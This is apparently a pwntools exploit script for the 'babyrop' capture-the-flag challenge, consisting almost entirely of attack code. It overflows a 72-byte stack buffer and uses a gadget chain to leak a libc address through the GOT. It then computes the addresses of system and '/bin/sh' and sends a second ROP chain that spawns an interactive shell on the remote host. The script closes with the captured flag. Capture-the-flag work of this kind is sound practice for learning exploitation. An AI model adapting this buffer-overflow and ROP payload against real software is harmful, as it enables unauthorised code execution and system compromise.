from pwn import *

elf = context.binary = ELF('./babyrop')
libc = ELF('./libc.so.6')

host = args.HOST or 'dicec.tf'
port = int(args.PORT or 31924)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
        #return gdb.debug([elf.path] + argv, env={"LD_PRELOAD": libc.path}, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)
        #return process([ld.path, elf.path] + argv, env={"LD_PRELOAD": libc.path}, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b main
continue
'''.format(**locals())

# -- Exploit goes here --

p = start()

p.recvuntil(": ")

buf = "A" * 72
buf += p64(0x00000000004011ca) #rbx rbp r12 r13 r14 r15
buf += p64(0) + p64(1) + p64(1) + p64(elf.got['write']) + p64(8) + p64(elf.got['write'])
buf += p64(0x00000000004011b0) 
buf += p64(0) * 7
buf += p64(elf.sym['main'])
p.sendline(buf)

# 0x7f3d700501d0
# log.info("write leak: {}".format((hex(u64(p.recv(8))))))

leak = int(hex(u64(p.recv(8))), 16)
log.info("Write leak: {}".format(hex(leak)))

base = leak - libc.sym['write']
libc_sys = base + libc.sym['system']
libc_binsh = base + libc.search("/bin/sh").next()

pop_rdi = 0x00000000004011d3
ret = 0x000000000040101a

buf = "A" * 72
buf += p64(ret) #ret
buf += p64(pop_rdi)
buf += p64(libc_binsh)
buf += p64(libc_sys)

p.sendline(buf)

p.interactive()

# cat flag.txt
# dice{so_let's_just_pretend_rop_between_you_and_me_was_never_meant_b1b585695bdd0bcf2d144b4b}